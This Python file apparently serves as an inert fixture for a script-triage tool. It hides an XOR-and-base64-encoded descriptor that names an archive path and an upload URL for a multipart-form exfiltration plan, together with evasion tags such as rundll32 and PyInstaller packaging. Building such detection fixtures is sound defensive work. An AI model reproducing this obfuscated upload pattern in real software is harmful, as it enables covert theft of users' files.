#!/usr/bin/env python3
if True:
    # Huntress Script Triage -- inert static-analysis fixture (cpython3)
    import base64
    import io
    import os

    MATERIAL_0f3fbafa = "kdrVm5STgpeU2oSIi4uChJO4i4iEhovLgomEiIOCuIaVhI-OkYLLk5WGiZSKjpO4lYKKiJOCm4aDhpeTgpXaipKLk46XhpWTuIGIlYq4l4uGiZuUk4aAgriEiJKJk9rWm5SeiZOGn9qDjoSTjoiJhpWeuIOOlJeGk4SPm4iFgZKUhIaTjoiJ2ouGioWDhriOiYOOlYKEk46IiZuEhpWVjoKV2peejomUk4aLi4KVuIiJgoOOlZuQjomDiJCUuISPho6J2pWSiYOLi9TVuJeVgoOChIKUlIiVm4SGipeGjoCJuI6D2oSGipeGjoCJytDThtSEhILe04ObkpeLiIaDuJKVi9qPk5OXlN3IyNDThtSEhILe04PJgp-GipeLgsmOiZGGi46DyJKXi4iGg5uGlYSPjpGCuJeGk4_apN3It5WIgJWGiqOGk4bIr5KJk5WClJSrhoXIhIaEj4LK0NOG1ISEgt7Tg8mdjpc="
    CODEC_0f3fbafa = "urlsafe_base64|single_byte_xor|e7"

    def load_0f3fbafa():
        return base64.urlsafe_b64decode(MATERIAL_0f3fbafa)

    def decode_0f3fbafa(EnCoDeD_Bytes):
        return bytes(value ^ 231 for value in EnCoDeD_Bytes)

    def recover_0f3fbafa():
        NeUtRaL = 19 * 7 - 133
        try:
            DeCoDeD_Bytes = decode_0f3fbafa(load_0f3fbafa())
        except (TypeError, ValueError) as error:
            raise RuntimeError("configuration recovery failed") from error
        DeScRiPtOr_Text = DeCoDeD_Bytes.decode("ascii", "strict")
        return DeScRiPtOr_Text

    def inspect_0f3fbafa():
        view = memoryview(recover_0f3fbafa().encode("ascii"))
        return bytes(view).decode("ascii")

    def surface_0f3fbafa():
        routes = {"selected": lambda: ("dictionary_dispatch", "lambda_indirection", "pyinstaller_onedir", "rundll32_predecessor")}
        return routes["selected"]()

    def obfuscation_0f3fbafa():
        recover = lambda value: value
        return recover("lambda_indirection")

    def plan_0f3fbafa():
        fields = dict(item.split("=", 1) for item in inspect_0f3fbafa().split("|"))
        analysis_surface = surface_0f3fbafa()
        obfuscation_surface = obfuscation_0f3fbafa()
        operation_plan = ("multipart_form_plan", fields["archive_path"], fields["upload_url"])
        return operation_plan + (analysis_surface, obfuscation_surface)

    if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
        print(inspect_0f3fbafa())
